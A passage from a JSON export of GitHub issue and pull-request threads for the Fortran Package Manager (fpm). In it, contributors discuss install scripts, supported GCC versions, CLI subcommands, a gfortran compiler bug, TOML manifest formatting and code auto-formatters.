                    "text": "I don't think we can guarantee an install method for Stack for users without root access; Stack itself has a number of dependencies which may require root access to install.\nFrom https://docs.haskellstack.org/en/stable/README/:\n\nNote that the get.haskellstack.org script will ask for root access using sudo in order to use your platform's package manager to install dependencies and to install to /usr/local/bin.\n\nFrom https://docs.haskellstack.org/en/stable/install_and_upgrade/#linux:\n\nEnsure you have required system dependencies installed. These include GCC, GNU make, xz, perl, libgmp, libffi, and zlib. We also recommend Git and GPG. To install these using your package manager:\n\nDebian / Ubuntu: sudo apt-get install g++ gcc libc6-dev libffi-dev libgmp-dev make xz-utils zlib1g-dev git gnupg netbase\n\n\n\nA solution for non-root users may simply be to provide binaries for common platforms; I now have a branch tracking fortran-lang/master which uploads binary releases on push. I put this together as an easy solution for grabbing fpm in a CI."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-15 19:06:43+00:00",
                    "text": "@LKedward , that sounds (and from the link looks) like something that would be beneficial to have as part of this repository. Any chance you'd be willing to set it up? I think if those were \"official\" it would obviate the need for (at least anything complicated in) the install script.\nAnybody else have thoughts?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-15 19:17:28+00:00",
                    "text": "Any chance you'd be willing to set it up?\n\nYep happy to! I'll put together a pull request for discussion."
                },
                {
                    "user": "certik",
                    "date": "2020-10-27 19:47:31+00:00",
                    "text": "Hold on, I think a mistake was made in this PR. It seems to include tons of unrelated changes. @everythingfunctional did you merge more things by a mistake? When you update a PR, please ask for another review. We should be merging PRs with a nice git history that only do one thing. This PR, at least according to GitHub is mixing together many unrelated changes. It could also be just a mistake at GitHub, but in that case we should simply rebase on top of the latest master to ensure the PR is small and in this case only includes the install.sh script."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-27 20:15:10+00:00",
                    "text": "I think what Github is now showing after-the-fact is not correct. (I'm pretty sure) when I clicked merge, the only change showing was the addition of the install.sh script. There were no changes made, only merging in the master branch to make sure there were no conflicts (which was admittedly unnecessary)."
                },
                {
                    "user": "certik",
                    "date": "2020-10-27 21:27:23+00:00",
                    "text": "Before you merged, master was at the commit: 4443986, which is fine. This PR was at a commit cda71a0, and when you clicked \"Merge\", GitHub added the merge commit a22ce1c, which is now the latest master.\nIf you look at cda71a0 (i.e., this PR) and the history in there, this is what I see:\n*   cda71a0 (HEAD) Merge branch 'installer' of github.com:sourceryinstitute/fpm into installer\n|\\  \n| * b44b567 fix(install.sh): define install_path earlier\n| * de96c4a Update install.sh\n| * 7eca78c add skeletal installer\n| * d64e54a WIP: start installation script\n* | e331951 fix(install.sh): define install_path earlier\n* | 108a997 Update install.sh\n* | 6624b64 add skeletal installer\n* | 70b25be WIP: start installation script\n* |   4443986 Merge pull request #213 from everythingfunctional/bootstrap_submodule_support\n|\\ \\  \n| * | 488bdd0 Add .gitignore file in submodules example package\n| * | 03c9efc Add test with submodule example project and fix .smod naming convention\n| * | f196336 Fix CI scripts\n| * |   39cca4d Merge branch 'master' into bootstrap_submodule_support\n| |\\ \\  \n| * | | e7b135b convert buildDirectory path to native in buildProgram\n...\n\nSo it seems it is not clean --- the commits are there twice, such as b44b567 and e331951, etc. I don't quite understand how it happened, but it does not seem right.\nAnyway, we can probably keep it, since the alternative is to revert this."
                }
            ]
        },
        {
            "number": 205,
            "user": "awvwgk",
            "date": "2020-10-08 10:30:27+00:00",
            "title": "Supported compilers to build fpm",
            "text": "What range of compilers should Fortran fpm support to build itself? Question is more regarding GCC version, but we could also discuss how Intel, PGI, NAG, ... compilers should work together with Fortran fpm. Of course this requirements for Fortran fpm becomes strict requirements for all dependencies used in Fortran fpm as well.\nFor example, if we want to distribute fpm with common toolchains like homebrew and conda-forge, we will have drastic limitations on the GCC version we can use:\n\nhomebrew: GCC 5\nconda-forge: GCC 7.5\n\nSupporting GCC 5 can be hard, because many features are missing. GCC 7.5 sounds reasonable to me, even if it means we might have to workaround some know ICE or bug at some point.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-08 10:41:08+00:00",
                    "text": "I agree, 7.5 should be doable as a minimum version. I've been using 7.5.0 on Ubuntu without any problems so far. Versions prior to 7 would be too restrictive IMO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-08 14:32:58+00:00",
                    "text": "I don't think we should concern ourselves too much with supporting older compilers. I don't think most people will need or want to compile it from scratch. Most would prefer an installer, or a single executable. I think the goal for fpm should be to supply packages for the most common package managers. I.e.\n\nyum\napt\npacman\nhomebrew\nWindows installer (maybe?)\nWindows package manager (I know there are one or two but I'm not familiar with them)"
                },
                {
                    "user": "certik",
                    "date": "2020-10-08 23:06:41+00:00",
                    "text": "Also:\n\nConda\nSpack"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-09 10:07:30+00:00",
                    "text": "The other thing is CI support, for OSS we can easily cover GCC 5 to 10 and Intel 20 as well as PGI 20.7, at least I already setup CI's for those.\n\nWindows package manager (I know there are one or two but I'm not familiar with them)\n\nchoco and nuget"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-10 20:02:33+00:00",
                    "text": "Got the first GCC migrator on my conda-forge feedstocks today, so the cf toolchain will in future be GCC 9.3. I will have a look at homebrew again, maybe they migrate from GCC 5 at some point as well."
                }
            ]
        },
        {
            "number": 204,
            "user": "urbanjost",
            "date": "2020-10-07 07:27:00+00:00",
            "title": "More issues for new",
            "text": "In regards to the Fortran implementation of fpm(1) I believe this\nshould close\n\n#109 fpm new should do --with-executable by default\n#110 Rename --with-executable to --bin (or --app) enhancement\n#111 introduce --lib to initalize a project with a library\n#135 Command line interface (CLI) fpm-fortran\n#138 fpm run --args \"a b c\" should become fpm run -- a b c\n#154 Implement fpm new fpm-fortran\n#196 not all directory names are valid project names\n\nand show\n   fpm help SUBCOMMAND\nextended to\n   fpm help SUBCOMMAND|FORTRAN_LANGUAGE\nThis integrates Fortran documentation into the CLI in a platform-independent\nmanner. In addition to installing packages fpm(1) already is well on it's\nway to replacing make(1)-like utilities and masks using ar(1), compiling and\nloading and creating static libraries. Some integration with debuggers,\nprofilers, and automated reformatters seems obtainable. Maybe it should be\nbe renamed \"fip\" for \"Fortran Integration and Packaging\". It is a lot easer\nto type.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-07 11:12:18+00:00",
                    "text": "Great work @urbanjost. I really like the cross-platform solution for including the Fortran man pages! I will look over in more detail later. Looks like you need to update your CLI tests?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 13:32:48+00:00",
                    "text": "I will put in the matching tests if the initial response is to go forward with the changes later today. If there were not so many nuances to color and terminal emulators I would put in the color version. That was just a quick \"what if\" idea but I liked the results."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 21:23:42+00:00",
                    "text": "It is hitting what is reported as a compiler bug in the log, which may have to do with MSWindows filenames. I renamed the git(1) repository to test if the name was the issue but from the log files it does not appear that the build is pulling the remote dependency packages. Is there a way I can clear the test to get a full build from scratch? I am hoping the filename is the issue as it passes on Linux and Mac."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-07 21:29:18+00:00",
                    "text": "Since --test creates test/ and --app creates app/ anyone feel  that it should be --lib and lib/ and --src and src/? I checked some other package managers and --lib and src/ seems common and lib/ is usually reserved for object files so if changed it seems --src and src/ would be a more intuitive naming if this was being done in a vacuum; but that other package managers that others may be familiar with seem to use --lib and src/ from what I have seen so far. That seems to be worth some weight (?)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 08:39:22+00:00",
                    "text": "I've built this PR on one of my Windows setups (MSYS2, MinGW-w64, gfortran 9.2.0) and I can't reproduce the internal compiler error - everything builds and tests pass. The new functionality appears to be working as well. I'm not sure what is different between my MinGW installation and that of the CI, perhaps a different gcc version? Without reproducing the error, I'm stuck for a solution.\nAn ICE is always a compiler bug, but I am highly doubtful that it is an issue with the Windows filenames since this would almost certainly produce a meaningful error message from the compiler and I don't see how it could affect compiler internals. My guess is that the Windows CI is using an older version (8?) of gfortran that has since been fixed.\n\nIs there a way I can clear the test to get a full build from scratch?\n\nWith the exception of some caching for Haskell and h-fpm, the CI builds are always completely from scratch - there is no state preserved between CI invocations. This means that the git repositories are being fetched correctly since we can see the corresponding source files being compiled.\n\nEdit: a similar ICE bug reported here https://gcc.gnu.org/bugzilla/show_bug.cgi?id=92065"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 09:19:06+00:00",
                    "text": "Okay, I've reproduced the ICE outside of MSYS2, using plain MinGW (gfortran 8.1.0). I will have a look into it today."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-10-08 09:31:51+00:00",
                    "text": "There is a new distribution of MinGW/MSYS2 that offers gfortran 10.2\n(MinGW) and 9.2 (MSYS2). Perhaps the ICE as been solved with these versions\n\nOp do 8 okt. 2020 om 11:19 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Okay, I've reproduced the ICE outside of MSYS2, using plain MinGW (gfortran\n 8.1.0). I will have a look into it today.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#204 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR2LWS56BVXCGW4AHYLSJV7ZXANCNFSM4SHAJCVA>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-08 09:35:40+00:00",
                    "text": "I think I've found a fix @urbanjost : in package fortran-intrinsic-manpages, in file M_intrinsics.f90, change line 104 from\ncharacter(len=:),allocatable   :: textblock(:)\nto\ncharacter(len=132),allocatable   :: textblock(:)\n\nThanks @arjenmarkus, I need to update my MSYS2! I think you're probably right that this has been fixed after version 8.\nWe should probably add a separate target for MSYS2 with gfortran-9 in our CI checks for fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-08 23:42:39+00:00",
                    "text": "Thanks @LKedward. Unless the compiler was upgraded that seems to do it if I sent the length of allocatable character arrays."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-10 01:01:38+00:00",
                    "text": "During the refactoring I left out the patch to actually use the --backfill switch and to create a sample program not requiring a module if on fpm new NAME --app is used, apparently. When I pulled down the push request that was missing. Been a while so maybe I added that after the PR. Do the tests run in such a way that if I make a test program that actually runs 'fpm new' and checks for the existence of the output files will it clean up or allow that?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-10 08:03:08+00:00",
                    "text": "Yes, what you describe is allowed by the tests. You are free to create files during tests, these files cease to exist once the test completes."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-17 02:47:48+00:00",
                    "text": "Simplified the new_test.f90 test program per @LKedward, #207 tracked #204 primarily so merged the few small differences and delete #204 so except for correcting some spelling errors in some markdown files this is a much simpler change than it might appear,\nessentially fleshing out the fpm_command_line.f90 file and adding the fpm/cmds/new.f90 file and a test for the new subcommand.\nThe help text was written in txt2man(1) markdown so I could generate an HTML version easily for easier review:-HTML"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-18 01:19:26+00:00",
                    "text": "I changed the test scripts so remove the scratch files and gave the project a name of fpm_scratch_* to avoid inadvertently removing directories. The names were simple names that might possibly exist for some other reason.  I could just add the commands to the test.\nI added the specific REV for the intrinsics. I think the messages and STOP calls you are seeing are coming from a cached external dependency. There was a version where STOP and messages were added to explore other ways of testing the CLI module that were suggest here and because at that time f-fpm was doing stops and tracebacks for development purposes (I assume) that I was matching;  but that should not match the REV  in the TOML file and I do not see the messages in the webpage test logs or on my own machines.  We do not have a \"-refresh\"  function for external dependencies yet (at least in my version) so is that why you see the STOP and messages?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-18 11:07:17+00:00",
                    "text": "I could just add the commands to the test.\n\nYes, if you can put the cleanup commands in the test program instead that would be better actually!\n\nI think the messages and STOP calls you are seeing are coming from a cached external dependency.\n\nYep you are right, they went away when I built from scratch. Cheers!"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-18 17:58:31+00:00",
                    "text": "I use a preprocessor to generate the character variable declarations as Fortran sadly lacks a block text option, so I generally really do not manually generate the white space changes.  Does github have typically diff(1) options to optionally ignore whitespace differences?  I could change the preprocessor to always write the same length as an option so they come out the same width all the time, which would probably help."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-20 02:34:18+00:00",
                    "text": "Not sure if there is anything else I need to do or not? Is there a consensus  on the intrinsics? On the pro side it is intended as an additional feature to promote use of f-fpm. It is an out-of-the-box feature that promotes discussion on just what f-fpm can be -- is it purely a source package manager or is it a general interface for all things Fortran?  I would argue it could be a separate tool in a set of tools that could be accessed via f-fpm but there is not a mechanism for doing that yet. Should that be a future feature for everything like simple tools like a Fortran manual, fsplit90, dos2unix-like and expand-like programs to more elaborate features like formatters an auto-documenation tools? Anything that makes development easier an promotes better code seems fair game. I am open to removing it especially if there is momentum behind providing a simple \"tools\" utility although I have been finding I am using it quite often myself. I do not have a simple solution for the white-space issues other than I keep seeing mention of being able to toggle diff options on an off with github including ignoring white-space differences but the examples do not match up with anything I found on the github pages so far (although I did not look very long yet).  I think I addressed the other issues and would like to wrap this one up and clean up some issues with run and test. They need changed to match up with the differences between f-fpm and h-fpm and so on and make room for the other changes like working with remote dependencies to proceed. Anything else? This is getting very close to implementing all the basic functionality except for conditional recompilation and environment variables for customized builds and so on. It would be exciting to get this to the point of a functioning tool for people to try."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-20 08:25:23+00:00",
                    "text": "@urbanjost You raised a fair point, fpm in both bootstrap and Fortran variant are still lacking features. In case of the intrinsics the desired functionality is installing documentation as described in #195.\nProviding a basic install command to Fortran fpm would be the more sustainable solution than to include a feature into Fortran fpm due to the lack of the former. Regarding the other features you mentioned, maybe something like #211 would be a solution?\nNB, https://github.blog/2018-05-01-ignore-white-space-in-code-review/ works perfectly for ignoring whitespace changes."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-20 16:22:01+00:00",
                    "text": "Thanks @urbanjost, I don't think there's anything more you need to address currently. I think removing the intrinsic documentation was probably best since it hasn't been discussed in much detail - @awvwgk's plugin suggestion (#211) seems to address the extension of fpm's capabilities in a nicely modular manner and I agree an install command is probably the way forward there.\nAll that's left now is to get two more approvals."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-10-26 21:48:16+00:00",
                    "text": "I promise to review this tomorrow. Sorry for the delay."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 07:57:29+00:00",
                    "text": "Thanks for reviewing everyone, and many thanks @urbanjost! If there are no objections I will merge later today."
                }
            ]
        },
        {
            "number": 203,
            "user": "urbanjost",
            "date": "2020-10-04 15:13:42+00:00",
            "title": "refactor fpm.f90 to separate subcommand new into fpm_new_subcommand.f90",
            "text": "A simple refactoring per sugguestions by @awvwgk that pulls from fpm.f90 the code for the new subcommand into fpm_subcommand_new.f90.  The other subcommands have some overlap but new is very independent of the rest and it is an opportune time to separate new so that work can continue on #110, #109, and #111 without colliding with work rapidly progressing on the subcommand build.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-10-06 15:59:51+00:00",
                    "text": "Since it is so likely a subdirectory will be desired I made one. To accomodate the h-fpm naming rules I adjusted the filename to just command/new.f90 so the loader finds a module called command_new. Would have just gone with cmd/ but since cmd_ was already in use this seemed the clearest thing that worked and takes into account (as I understood them, at least) the requested name changes."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-06 16:22:48+00:00",
                    "text": "We should be prefixing with fpm_ so every new file should go into the already existing src/fpm directory. So in this case src/fpm/command/new.f90, I guess."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-06 23:36:14+00:00",
                    "text": "So I think this is the preferred/required file structure now."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-11 09:05:12+00:00",
                    "text": "@urbanjost I wonder why this refactoring PR includes all changes from the feature branch in #204. I would be in favour of moving this one forward, while I have some comments on #204 first. My suggestion is to build #204 on top of this PR and not the other way round."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-11 17:59:51+00:00",
                    "text": "Was holding off other changes completely hoping this one would get added. Started the other changes as a branch of this one, which several forum members gave instructions for and indicated was the standard way to proceed. Apparently that did not work or perhaps the subbranch changes are showing here? What would be the CLI commands to change it to the format you would prefer?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-12 11:24:48+00:00",
                    "text": "Yes I had a feeling this PR was being unintentionally pulled along for the ride with #204.\n@urbanjost  it looks like you are manually merging the branch 'more_issues_for_new' (PR #204) into 'urbanjs' (this PR) after each commit to 'more_issues_for_new' - this is what is dragging this branch along.\nI have reset the branch for this PR ('urbanjs') to where it original was. I have had to move the following subsequent commits to 'more_issues_for_new':\n\n0766793 check if name is a directory on backfill instead of depending on system command\na1318c3 simplify initializing git(1) repository\n\nImportant: you will need to realign your local copy to my updates before continuing:\n\nMake a backup branch of your local copies:\n\n$> git checkout urbanjs\n$> git checkout -b urbanjs-old\n$> git checkout more_issues_for_new\n$> git checkout -b more_issues_for_new-old\n\n\nFetch the latests changes\n\n$> git fetch --all\n\n\nAlign the local branches to remote\n\n$> git reset --hard origin/urbanjs\n$> git reset --hard origin/more_issues_for_new"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 10:41:16+00:00",
                    "text": "This PR is only a change in file structure - if there are no objections I will merge later today to make it easier to move forward with #204, #207."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-16 15:20:01+00:00",
                    "text": "Thanks again @urbanjost - I will review #207 now soon."
                }
            ]
        },
        {
            "number": 202,
            "user": "awvwgk",
            "date": "2020-10-03 16:30:47+00:00",
            "title": "Create package manifest with toml-f build interface",
            "text": "I'm experimenting a bit with the toml-f build interface to create a package manifest, instead of having TOML documents inlined in the source code.\n\n use build interface to create package manifest, instead of inlining\n each manifest type should know how to translate itself to TOML\n add constructors for each type to rapidly create a package manifest\n\nTo discuss:\n\npreferred style for package manifest (toml-f serializer is not style preserving, but serializer can be customized)\nfor fpm new in case we find an existing manifest, we can (a) do nothing, (b) overwrite or (c) merge\n\nRelated:\n\n#201 requires fpm to rewrite the package manifest",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-06 09:25:00+00:00",
                    "text": "I can see the value in this, especially for the likes of #201 for which it is necessary. Also for replacing the inline toml that we currently have, this is a much nicer approach!\nAs a user I could perhaps be slightly annoyed by the manifest being re-formatted (especially for git diffs), but this is only a minor inconvenience.\nI don't use toml enough to have an opinion on the style so I will defer to others here.\nFor fpm new I don't see the value in c) merging because auto-discovery means that the manifest doesn't actually need modifying for fpm new I don't think. I would probably prefer a) do nothing with a warning."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-06 11:59:53+00:00",
                    "text": "As a user I could perhaps be slightly annoyed by the manifest being re-formatted (especially for git diffs), but this is only a minor inconvenience.\n\nOne thing that would currently happen in this process is the conversion of all inline tables:\n [dependencies]\n-toml-f = { git = \"https://github.com/toml-f/toml-f\", tag = \"v0.2\" }\n+[dependencies.toml-f]\n+git = \"https://github.com/toml-f/toml-f\"\n+tag = \"v0.2\"\nBut I could adjust this in toml-f if you prefer to keep them (the information is there, but the serializer simply doesn't care).\nOne thing toml-f currently cannot do is preserve dotted keys:\n [dependencies]\n-toml-f.git = \"https://github.com/toml-f/toml-f\"\n+[dependencies.toml-f]\n+git = \"https://github.com/toml-f/toml-f\"\nAlso whitespace and comments are not preserved.\nIn case the package manifest is created with fpm new and managed with fpm add and so on, the diffs would always be minimal."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 18:02:19+00:00",
                    "text": "Closing this for now due to time constraints. I might give it a try at a later point again."
                }
            ]
        },
        {
            "number": 201,
            "user": "ivan-pi",
            "date": "2020-10-03 15:19:29+00:00",
            "title": "Adding a dependency",
            "text": "Quoting from DUB's documentation (DUB is D's official package manager):\n\nAdding a dependency\nWhen you find a package to use from the DUB registry, add it to the dependency list in your DUB configuration file by running dub add <packageName>.\nThe DUB registry uses git tags to determine application versioning and DUB's dependency management is designed to work best according to SemVer rules. Please follow the rules of the SemVer specification for all packages you list on the registry. See the package documentation for more information on dependency version specification.\n\nI think this would be a nice addition to fpm.\nPerhaps also other commands from DUB could be suitable for fpm: https://dub.pm/commandline",
            "comments": []
        },
        {
            "number": 200,
            "user": "LKedward",
            "date": "2020-10-03 13:16:40+00:00",
            "title": "Source processing bug fixes",
            "text": "Fixes bug where app modules are duplicated in the source list if auto-discovery is used and the app is specified in the manifest - this leads to duplicated symbols at linking;\n\n\nFixes bug where include statements are incorrectly detected where there are none;\n\n\nTests updated accordingly.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-10-06 09:25:41+00:00",
                    "text": "I realise I included these bug fixes in #193 which has been reviewed, so I will close this."
                }
            ]
        },
        {
            "number": 199,
            "user": "urbanjost",
            "date": "2020-10-02 15:06:45+00:00",
            "title": "system call to git(1) as a preliminary remote dependency method for Fortran fpm?",
            "text": "Since git(1) is being assumed as an installed package and being used to do an initial new project in both versions of fpm(1) would it be reasonable to use a git(1) system call in f-fpm to pull remote dependencies so that all base functions are available?\nThis would allow the f-fpm version to have basic full functionality (build,run,test,new) and allow for completing prototypical development of all of the lbase ocal platform features.  Thoughts?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 16:30:28+00:00",
                    "text": "That's exactly what the Haskell version is doing, so I'd be in favor of it, at least for now."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 16:36:17+00:00",
                    "text": "Did not realize that but that certainly goes a long way toward proving it would work!"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-02 16:46:08+00:00",
                    "text": "Does h-fpm then make a recursive call to h-fpm to build it as well when it builds the remote packages?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 17:01:40+00:00",
                    "text": "It doesn't launch a new process, but fetching and building the dependencies is a recursive procedure."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-02 17:04:32+00:00",
                    "text": "See bootstrap/src/Fpm.hs lines 540 - 677 for how it's done."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-03 13:18:36+00:00",
                    "text": "Based on this I've now added support for remote git dependencies in #193, since it only requires a small addition."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-10-03 14:17:18+00:00",
                    "text": "Fantastic. Between the f-toml interface and the work you have done on building all the fun stuff has progressed so dramatically it looks like it will be able to bootstrap itself very soon. Should I close this one?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:27:13+00:00",
                    "text": "Closing as implemented in #193"
                }
            ]
        },
        {
            "number": 198,
            "user": "urbanjost",
            "date": "2020-10-01 21:52:53+00:00",
            "title": "Pull request for comments",
            "text": "sort out branches\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\nbasic RUN subcommand\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\nbuild on proposed CLI interface to make a \"new\" and \"run\" subcommand for discussion\nbasic new,test,run added to build subcommands\nchange quoting of -- ARGS values for more platform independence and change test accordingly\nreplace cli_test test\nconsistent indenting\nerrata for NEW PR",
            "comments": []
        },
        {
            "number": 197,
            "user": "awvwgk",
            "date": "2020-09-30 17:49:42+00:00",
            "title": "Autoformatting of Fortran source?",
            "text": "Should we have a formatting tool for fpm? It would be nice to not have to worry about any whitespace related discussions in a PR and instead have a CI tests running the formatter and reporting if changes are needed to match the style guide.\nI tried lfortran fmt, fprettify and findent on fpm to check the impact, all have some drawbacks:\n\nlfortran fmt currently strips comments and use statements (using 0.8.1 from cf), fmt feature seems still WIP\nfprettify (0.3.6 from pypi) has some interesting understanding about intrinsic functions with an all or nothing setting for whitespace between the keyword and the parenthesis\nfindent (3.1.7 from cf) just handles the indentation (exactly as it says on the tin), but does not indent continuation lines with a & character\n\nSo non of those would be able to preserve any of the current files as they are. I don't have a strong preference for either of those tools, as long as it takes away the burden to check for the style guide and whitespace conventions.\nlfortran fmt and findent could be easily installed via conda in a CI workflow, fprettify can be installed by pip. Anything else I missed?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-30 19:22:22+00:00",
                    "text": "I am happy to improve lfortran fmt if you would consider using it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-30 20:10:37+00:00",
                    "text": "@certik lfortran fmt made the smallest diff not counting the missing comments and imports, so this would be great to have."
                },
                {
                    "user": "certik",
                    "date": "2020-09-30 22:45:16+00:00",
                    "text": "@awvwgk ok, I am happy to fix those. I am tracking all the improvements to lfortran fmt here: https://gitlab.com/lfortran/lfortran/-/issues/212. Anything else?\nHow about empty lines (in a subroutine, as well as between subroutines) ---- how should those be handled: ignored / reformatted, or preserved?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 22:47:31+00:00",
                    "text": "I would definitely be in favor of using an automated tool to format the code. As you mention it could save a lot of time dealing with and arguing about style.\nIf there is an existing tool that works, I'd be in favor of switching to it now. Even if there are some idiosyncrasies about the format that we may not prefer, unless there's some deal-breaker, I'd rather just not have to worry about it anymore. And then yes, we should add a step in the CI to make sure running it on all the files doesn't change them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-30 22:49:29+00:00",
                    "text": "My vote on empty lines would be to remove consecutive ones, so never have more than 1 blank line as a separator."
                },
                {
                    "user": "certik",
                    "date": "2020-09-30 22:51:49+00:00",
                    "text": "Right now, lfortran fmt generates empty lines between subroutines and so on. This can be made configurable. But the question I have is if it should preserve empty lines put in by the user, such as in:\nif (something) then\n    i = 5\n\n    j = 4\nend if\nCurrently this will always be transformed into:\nif (something) then\n    i = 5\n    j = 4\nend if\nSince clang-format preserves those, I think lfortran fmt should too.\nBtw, if you are willing to use it, I'll work day and night to make it work."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-01 08:48:27+00:00",
                    "text": "I'd prefer a fully-automated solution (over a pass/fail CI check) which commits formatting changes in the CI either during pull requests or on merge into master. See this article for an example.\nThe advantages of this approach are:\n\nno back-and-forth with the CI to get formatting checks to pass;\nlocal testing does not require contributors to download the formatting tool and maintain the same version between each other;\nkeeps the PR process simple for new contributors and those not familiar with git/github;\nremoves formatting workload from both contributor and reviewer;\nformatting changes are well-contained within specific formatting commits."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-01 15:12:03+00:00",
                    "text": "Good point @LKedward , I agree."
                },
                {
                    "user": "certik",
                    "date": "2020-10-01 15:28:24+00:00",
                    "text": "The way it can work is that the formatting is applied (but not committed) before running CI tests, to ensure that the CI tests actually work after applying the formatting. Then after the PR is merged, the formatting is actually committed."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-10-01 16:09:21+00:00",
                    "text": "The way it can work is that the formatting is applied (but not committed) before running CI tests, to ensure that the CI tests actually work after applying the formatting. Then after the PR is merged, the formatting is actually committed.\n\nI somewhat disagree. I think it should try and apply the formatting, and only if the tests fail (assuming they passed before) does it not actually commit. As a reviewer, I'd like to see the code that will actually be merged."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-01 16:35:33+00:00",
                    "text": "I got some ads for automated code style fixing some time ago solving exactly this kind of problem. I'll check if I find the app on the GH marketplace.\nIn short it does the following:\n\nruns a code formatter, (optionally) reports back the status to the PR\nin case there is a diff, it will be committed to a separate branch\nto apply the changes a PR against the authors branch is opened automatically\nthe author can review and merge those changes or fix it locally instead"
                },
                {
                    "user": "certik",
                    "date": "2020-10-01 17:56:15+00:00",
                    "text": "Yes, I've been struggling with reviewing the final code --- being the author of the formater, I know that there is a possibility of a bug in it, and so I would also like to see the final code before it gets committed. @awvwgk's solution should work."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-01 18:52:15+00:00",
                    "text": "@certik you might be right, using lfortran fmt will probably run into plenty of bugs first and the fpm code base is too small to be a good test case. But since most of us are developing open source and/or proprietary Fortran code bases, we should easily get a few hundred thousand lines of Fortran source code together for cross checking the formatter. I'll volunteer my projects to check lfortran fmt for this purpose."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-02 08:45:43+00:00",
                    "text": "I got some ads for automated code style fixing some time ago solving exactly this kind of problem. I'll check if I find the app on the GH marketplace.\n\nIt is indeed a rather new project:\n\nsource: https://github.com/restyled-io/restyled.io\nhomepage: https://restyled.io/\nGH marketplace: https://github.com/marketplace/restyled-io\n\nOf course Fortran is not under the supported languages, but it is written in Haskell, so we might be able to contribute fixes back in case we have to.\nThe alternative is to write it ourselves with GH actions. Using fprettify as a start is probably the best choice for now."
                },
                {
                    "user": "MuellerSeb",
                    "date": "2020-10-05 10:05:43+00:00",
                    "text": "Since clang-format preserves those, I think lfortran fmt should too.\n\nAlso like black does it in Python: preserve 1 empty line, but more should be cut down to 1."
                },
                {
                    "user": "certik",
                    "date": "2020-10-05 12:40:19+00:00",
                    "text": "Also like black does it in Python: preserve 1 empty line, but more should be cut down to 1.\n\nGood idea. This can be the default, and we can make this configurable."
                }
            ]
        },
        {
            "number": 196,
            "user": "urbanjost",
            "date": "2020-09-27 20:55:39+00:00",
            "title": "not all directory names are valid project names",
            "text": "Currently the \"new\" subcommand is given a name that is also suitable as a module name and a project name. Should that be the case?  More and more systems support Unicode names for directories and so on.  As a simple example if you enter\nsomething like\nfpm new 1\nfpm new project.1\nyou can see the problem",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 21:19:06+00:00",
                    "text": "This is one of many things I didn't consider to be necessary to deal with in the prototype, but we should absolutely tackle in the Fortran version. There are essentially 2 ways to handle this specific problem:\n\nReject names that are not valid Fortran identifiers and issue an error message to the user without doing anything\nFor anywhere that the name appears as an identifier in the code, convert invalid symbols to _, but still need to reject the name and issue an error message if the first character is not an ASCII letter\n\nI would prefer option 1 as it is more concise and simple, but if there is sufficient support for 2 I think it would be acceptable."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 23:10:37+00:00",
